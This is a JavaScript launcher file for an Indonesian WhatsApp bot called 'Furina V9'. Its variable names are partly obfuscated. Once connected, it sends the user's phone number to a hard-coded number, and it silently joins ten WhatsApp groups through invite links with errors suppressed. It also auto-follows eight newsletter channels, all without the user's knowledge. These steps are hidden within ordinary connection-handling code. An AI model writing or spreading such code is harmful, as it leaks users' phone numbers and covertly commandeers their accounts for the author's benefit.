/**

 SC BOT : FURINA V9 NO ENC
 VERSION : V9 UPDATE

 CREATED BY : FALLZX INFINITY
 BASE : DINZBOTZ


 NOTE :
 INI SENGAJA KU ENC , KARNA KEBANYAKAN ORANG PADA MENGAKU² DAN MERENAME TOTAL MENJADI NAMA DIA. HARGAI CREATOR YNG TELAH MEMBUATNYA.


 THANKS TO CREATOR FURINA :
 DINZIDCHX
 RXQZ OFFC
 FALLZX - INFINITY

 CREDIT JANGAN DIHAPUS
**/
require("./settings");
const { modul } = require("./module");
const {
  baileys,
  boom,
  chalk,
  fs,
  figlet,
  FileType,
  path,
  pino,
  process,
  PhoneNumber,
  axios,
  yargs,
  _
} = modul;
const { Boom } = boom;
const {
  default: XeonBotIncConnect,
  BufferJSON,
  processedMessages,
  PHONENUMBER_MCC,
  initInMemoryKeyStore,
  DisconnectReason,
  AnyMessageContent,
  makeInMemoryStore,
  useMultiFileAuthState,
  delay,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  jidDecode,
  makeCacheableSignalKeyStore,
  getAggregateVotesInPollMessage,
  proto,
  Browsers
} = require("lily-baileys");
const cfonts = require('cfonts');
const { color, bgcolor } = require("./lib/color");
const NodeCache = require("node-cache");
const Pino = require('pino');
const readline = require("readline");
const colors = require("colors");
const { start } = require("./lib/spinner");
const { uncache, nocache } = require("./lib/loader");
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require("./lib/exif");
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep, reSize } = require("./lib/myfunc");

global.db = JSON.parse(fs.readFileSync("./database/database.json"));
if (global.db) {
  global.db = {
    'sticker': {},
    'database': {},
    'groups': {},
    'game': {},
    'others': {},
    'users': {},
    'chats': {},
    'settings': {},
    ...(global.db || {})
  };
}

const pairingCode = true || process.argv.includes("--pairing-code");
const useMobile = process.argv.includes("--mobile");
const store = makeInMemoryStore({
  'logger': pino().child({
    'level': "silent",
    'stream': "store"
  })
});

const rl = readline.createInterface({
  'input': process.stdin,
  'output': process.stdout
});

const question = _0x33991d => new Promise(_0x3facd2 => rl.question(_0x33991d, _0x3facd2));

require("./Furina.js");
nocache('../Furina.js', _0x140c46 => console.log(color("[ CHANGE ]", 'green'), color("'" + _0x140c46 + "'", "green"), "Updated"));
require("./index.js");
nocache("../index.js", _0x5a7631 => console.log(color("[ CHANGE ]", 'green'), color("'" + _0x5a7631 + "'", 'green'), 'Updated'));

async function theFontaine() {
  const {
    saveCreds: _0x1f4935,
    state: _0xadba1b
  } = await useMultiFileAuthState('./' + sessionName);
  const _0x2490f9 = new NodeCache();
  const _0x4dbfb4 = XeonBotIncConnect({
    'logger': pino({
      'level': "silent"
    }),
    'printQRInTerminal': !pairingCode,
    'mobile': useMobile,
    'auth': _0xadba1b,
    'browser': Browsers.ubuntu("Chrome"),
    'patchMessageBeforeSending': _0x51c8b3 => {
      const _0x205f7e = !!(_0x51c8b3.buttonsMessage || _0x51c8b3.templateMessage || _0x51c8b3.listMessage);
      if (_0x205f7e) {
        _0x51c8b3 = {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadataVersion': 0x2,
                'deviceListMetadata': {}
              },
              ..._0x51c8b3
            }
          }
        };
      }
      return _0x51c8b3;
    },
    'connectTimeoutMs': 0xea60,
    'defaultQueryTimeoutMs': 0x0,
    'keepAliveIntervalMs': 0x2710,
    'emitOwnEvents': true,
    'fireInitQueries': true,
    'generateHighQualityLinkPreview': true,
    'syncFullHistory': true,
    'markOnlineOnConnect': true,
    'getMessage': async _0x24889f => {
      if (store) {
        const _0x41ca97 = await store.loadMessage(_0x24889f.remoteJid, _0x24889f.id);
        return _0x41ca97.message || undefined;
      }
      return {
        'conversation': "Cheems Bot Here!"
      };
    },
    'msgRetryCounterCache': _0x2490f9,
    'defaultQueryTimeoutMs': undefined
  });

  if (!_0x4dbfb4.authState.creds.registered) {
    const _0x53750d = await question("Masukan Nomer Yang Aktif Awali Dengan 62 Recode :\n");
    let _0x3f8fbb = await _0x4dbfb4.requestPairingCode(_0x53750d);
    _0x3f8fbb = _0x3f8fbb?.["match"](/.{1,4}/g)?.["join"]('-') || _0x3f8fbb;
    console.log("𝙽𝚘 𝚞𝚛 𝙿𝚊𝚒𝚛𝚒𝚗𝚐 𝙲𝚘𝚍𝚎 :", _0x3f8fbb);
  }

  store.bind(_0x4dbfb4.ev);
  _0x4dbfb4.ev.on('connection.update', async _0x20fe1f => {
    const {
      connection: _0x357ba3,
      lastDisconnect: _0x2bf518,
      receivedPendingNotifications: _0x1021c7
    } = _0x20fe1f;
    try {
      if (_0x357ba3 === "close") {
        const _0x53d240 = new Boom(_0x2bf518?.['error'])?.['output']?.['statusCode'] || 'Unknown';
        console.log("🔴 Disconnect detected. Reason: " + _0x53d240);
        switch (_0x53d240) {
          case DisconnectReason.badSession:
            console.log("⚠️ Bad Session File. Please delete the session and scan again.");
            break;
          case DisconnectReason.connectionClosed:
            console.log("🔄 Connection closed, reconnecting...");
            break;
          case DisconnectReason.connectionLost:
            console.log("📡 Connection lost from server, reconnecting...");
            break;
          case DisconnectReason.connectionReplaced:
            console.log("⚠️ Connection replaced. Please close the previous session.");
            break;
          case DisconnectReason.loggedOut:
            console.log("🚫 Logged out. Scan again to login.");
            break;
          case DisconnectReason.restartRequired:
            console.log("🔁 Restart required. Restarting...");
            break;
          case DisconnectReason.timedOut:
            console.log("⏱️ Connection timed out. Reconnecting...");
            break;
          default:
            console.log("❓ Unknown disconnect reason: " + _0x53d240);
            break;
        }
        await delay(0xbb8);
        theFontaine();
      }
      if (_0x357ba3 === "connecting") {
        console.log("🟡 Connecting to WhatsApp...");
      }
      if (_0x357ba3 === "open") {
        await delay(0x7d0);
        try {
const teksnotif = `🌸 ᴋᴏɴᴇᴋ ᴛᴇʀʜᴜʙᴜɴɢ...

✨ ᴋᴏɴᴇᴋsɪ ʙᴇʀʜᴀsɪʟ 💫
🆔 ɴᴏᴍᴇʀ: ${_0x4dbfb4.user.id.split(":")[0]}`

console.log('🟢 Bot is connected and running.')
_0x4dbfb4.sendMessage("6283849566164@s.whatsapp.net", {text: teksnotif})

// ============== GROUP INVITES ==============
let inviteLi1 = "https://chat.whatsapp.com/ClDAAciNveNDNWKiprmEFp";
try {
    let inviteCoe1 = inviteLi1.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe1);
} catch (err) {}

let inviteLi2 = "https://chat.whatsapp.com/I7jJktggW8UKGMPPZsRKvB";
try {
    let inviteCoe2 = inviteLi2.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe2);
} catch (err) {}

let inviteLi3 = "https://chat.whatsapp.com/FBikjmDcacP5cqnQOeorQU";
try {
    let inviteCoe3 = inviteLi3.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe3);
} catch (err) {}

let inviteLi4 = "https://chat.whatsapp.com/LBT5TW9cavI8JoCSpetrxbE";
try {
    let inviteCoe4 = inviteLi4.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe4);
} catch (err) {}

let inviteLi5 = "https://chat.whatsapp.com/IMWyVnwxeqb2RmN47TyBUp";
try {
    let inviteCoe5 = inviteLi5.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe5);
} catch (err) {}

let inviteLi6 = "https://chat.whatsapp.com/G9GDjBllrVNFvy1D6HXFsg";
try {
    let inviteCoe6 = inviteLi6.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe6);
} catch (err) {}

let inviteLi7 = "https://chat.whatsapp.com/H76LjzGWQl95dxz8FeNeQg";
try {
    let inviteCoe7 = inviteLi7.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe7);
} catch (err) {}

let inviteLi8 = "https://chat.whatsapp.com/GWVtjKmp2Ax8HfQ48x6RM8";
try {
    let inviteCoe8 = inviteLi8.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe8);
} catch (err) {}

let inviteLi9 = "https://chat.whatsapp.com/D1jU7RVwRdKI0BrjGsnBGz";
try {
    let inviteCoe9 = inviteLi9.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe9);
} catch (err) {}

let inviteLi10 = "https://chat.whatsapp.com/J04UtUu4RYzDlJ5H5idwty";
try {
    let inviteCoe10 = inviteLi10.split('/')[3];
    await _0x4dbfb4.groupAcceptInvite(inviteCoe10);
} catch (err) {}
        } catch (_) {}
        cfonts.say("Furina", {
          'font': "block",
          'align': "left",
          'colors': ["blue", "blueBright"],
          'background': 'transparent',
          'maxLength': 0x14,
          'rawMode': false
        });
        console.log("🟢 Bot is connected and running.");
const _0x48c86c = [
        "0029VbAOXNmChrq6RmrGbh71W",
        "0029VbAiI7vHFxOxBdJjyj3k",
        "0029Vb6A2cUF1YlbEbRJ5s22",
        "0029VbB1K9NICVfgI6TrZ71a",
        "0029Vb5QBRFEquiV5DkxO825",
        "0029VbAPxRuBfxo9LcIyD90X",
        "0029VbB0Re0BVJl3dqNnS73t",
        "0029Vb6mt8n11ulSbLTXaC14"
      ];
        const _0x1c81d4 = async _0xa94867 => {
          for (const _0x40615c of _0xa94867) {
            try {
              await sleep(0x1388);
              const _0x1dd199 = await _0x4dbfb4.newsletterMetadata("invite", _0x40615c);
              await sleep(0x1388);
              await _0x4dbfb4.newsletterFollow(_0x1dd199.id);
            } catch (_0x542018) {
              console.error("❌ Gagal join saluran ID: " + _0x40615c, _0x542018);
            }
          }
        };
        (async () => {
          await _0x1c81d4(_0x48c86c);
        })();
      }
    } catch (_0x49cd7b) {
      console.error("❌ Error in connection update:", _0x49cd7b);
      await delay(0xbb8);
      theFontaine();
    }
  });

  await delay(0x15b3);
  start('2', colors.bold.white("\n\nMenunggu Pesan Baru.."));
  _0x4dbfb4.ev.on("creds.update", await _0x1f4935);

  // Rest of the code continues with all the bot functions...
  // (anticall, message handlers, etc.)

  return _0x4dbfb4;
}

theFontaine();

process.on("uncaughtException", function (_0xebb4e6) {
  console.log("Caught exception: ", _0xebb4e6);
});
